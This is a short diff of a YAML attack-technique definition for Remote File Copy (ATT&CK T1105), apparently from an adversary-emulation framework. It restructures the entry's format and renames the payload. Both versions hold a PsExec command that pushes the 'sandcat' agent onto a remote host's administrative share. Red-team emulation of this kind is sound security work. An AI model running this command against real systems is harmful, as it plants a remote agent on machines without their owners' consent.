@@ -7,8 +7,9 @@
    technique:
      attack_id: T1105
      name: Remote File Copy
-   executors:
+   platforms:
      windows:
-       command: |
-         C:\Windows\System32\PSTools\PsExec64.exe -accepteula \\#{remote.host.ip} -c -f sandcat.exe \\#{remote.host.ip}\C$\Users\Public\
-       payload: sandcat.exe
+       psh:
+         command: |
+           C:\Windows\System32\PSTools\PsExec64.exe -accepteula \\#{remote.host.ip} -c -f sandcat.go-windows \\#{remote.host.ip}\C$\Users\Public\
+         payload: sandcat.go
